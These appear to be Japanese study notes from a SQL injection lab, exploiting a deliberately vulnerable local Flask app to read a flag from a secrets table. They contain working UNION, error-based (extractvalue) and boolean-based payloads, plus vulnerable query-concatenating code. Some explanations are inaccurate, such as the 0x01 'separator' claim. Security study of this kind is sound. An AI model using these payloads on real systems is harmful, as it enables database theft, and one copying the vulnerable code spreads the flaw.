### SQL インジェクション

Web アプリケーションにおいてユーザが指定した値をもとに、SQL を組み立てる際に、その値を適切に処理しないまま SQL 分の一部として利用してしまうことにより、意図しないデータベース操作が可能となる脆弱性

- web1 を参照

  - プログラムには `kv(id, k, v), secrets(id, data)` という 2 つのテーブルがある
  - secrets テーブルにフラグとなる文字列が含まれているので、攻撃して取得する

- SELECT 文における攻撃方法

  - UNION 句を用いた攻撃手法
    - SQL 文の実行結果が直接ユーザに返却されるような状況において有効
  - Error ベースの攻撃手法
    - SQL 文の実行エラーの内容がユーザに出力されるような場合に有効（意図的に実行エラーを引き起こしエラー分の中に取得したいデータを出力させる)
  - Boolean ベースの攻撃手法
    - SQL 文の実行結果は直接ユーザに出力されないものの、実行結果に応じてレスポンスが変化するような状況において有効
      （取得したいデータの 1 文字列目が A なら 0、そうでない場合は 1」と意図的にレスポンスを変化させることを繰り返す）
  - Time ベースの攻撃手法
    - SQL 文の実行結果が一切返却されていないような状況で有効。SLEEP 関数を利用し、意図的に応答時間を変化させる
      （取得したいデータの 1 文字目が A なら 1 秒待機、そうでなければ待機しない」と意図的に応答時間を変化させる）

- UNION 句を用いた攻撃手法
  - `route_search_index`を攻撃対象とする。
    - `select k,v from kv where k like '%" + key + "%';`はユーザからのキーをそのまま結合しているだけなので攻撃できそう
    - `select k,v from kv where k like '%" union select 1, data from secrets;`のようなクエリを組み立ててみる
      - 選択しているカラムは k,v の 2 つなので union する際のパディングとして適当な値(1)を指定する必要がある。
    - パラメーター key に`' union select 1, data from secrets;#`を渡すとクエリが組み立てられる。

```python
@app.route("/search", methods=["GET"])
def route_search_index():

    key = request.args.get("key")
    if key == None:
        key = ""

    # ユーザからのキーをそのまま結合している
    sql = "select k,v from kv where k like '%" + key + "%';"

    db = get_db()
    try:
        cur = db.cursor()
        cur.execute(sql)

    except Exception as e:
        cur.close()
        return "Error", 500

    data = cur.fetchall()
    cur.close()

    return render_template("index.html", data=data, ndata=len(data))
```

- Error ベースの攻撃手法
  http://localhost:5001/

  - add の画面で文字列を入力すると 1 文字ごとにリクエストが飛んでいることを確認できる

```python
@app.route("/keyCheck", methods=["GET"])
def route_keycheck_index():

    key = request.args.get("key")
    sql = "select k from kv where k = '" + key + "';"

    db = get_db()
    try:
        cur = db.cursor()
        cur.execute(sql)

    except Exception as e:
        cur.close()
        return str(e), 500

    data = cur.fetchall()

    if len(data) == 0:
        return "not used"

    return "used"
```

- `'`を入力して構文エラーの情報を確認する

```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1")
```

- このエラー文を利用して secrets テーブルのデータをエラー情報中に出力させる

  - MySQL には`UpdateXML関数`や`ExtractValue関数`をうまく利用し、データベース中にある情報を意図的に取り出すことができる。[XML 関数](https://dev.mysql.com/doc/refman/8.0/ja/xml-functions.html)
  - `XPATH`として不適切な場合は出力されないため、`concat関数`を用いて適当な文字列を先頭含ませる。
  - `select k from kv where k = '||extractvalue(null,concat(0x01,(select data from secrets)));#`の SQL 文を完成させたい

- `null, concat(0x01, <expression>) `のような形式でバイナリデータを結合できる。この場合、0x01 はバイナリデータをセパレータとして使用し、攻撃者はその後に悪意のあるコマンドを記述することができる。[メモ](https://scrapbox.io/sugar-dev/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%A1%E3%83%A2)
  - セパレータ：バイナリデータを分割するために使用される特殊文字で、攻撃者はセパレータを使用して、SQL インジェクション攻撃を実行するための複数のコマンドを SQL 文に組み込むことができる。

`'%7C%7Cextractvalue%28null%2Cconcat%280x01%2C%28select%20data%20from%20secrets%29%29%29%3B%23`をキーとしてリクエストを送ると、、、

- Boolean ベースの攻撃手法

  - エラー時の出力が`Error`になっている
  - 取得できる 2 値のみを用いて全体の情報を取得する。（`SYBSTR関数`を用いて一文字ずつ使用済みかを確かめていく）
    - `select k from kv where k = 'notusedkey' or 1=if((select ascii(substr(data,1,0)) from secrets)=65,1,0);`
    - ASCII コードの 65(A)との比較を行い正しければ 1,異なれば 0 を返す
    - アプリケーション側のコードで下記の部分に注目すると、OR 以降の値が偽であれば not used と文字列が出力されることになる
    ```python
        if len(data) == 0:
        return "not used"
    ```
    - これを繰り繰り返すことで文字列の特定が可能になる

```python
@app.route("/keyCheck", methods=["GET"])
def route_keycheck_index():

    key = request.args.get("key")
    sql = "select k from kv where k = '" + key + "';"

    db = get_db()
    try:
        cur = db.cursor()
        cur.execute(sql)

    except Exception as e:
        cur.close()
        return "Error", 500

    data = cur.fetchall()

    if len(data) == 0:
        return "not used"

    return "used"
```

- 手動でやるのはめんどいので、、、`python3 ../scripts/sqli-boolean-exploit.py`

- Time ベースの攻撃手法
  - 考え方は boolean ベースのものと同じ感じなので割愛

### INSERT/UPDATE 文における攻撃手法
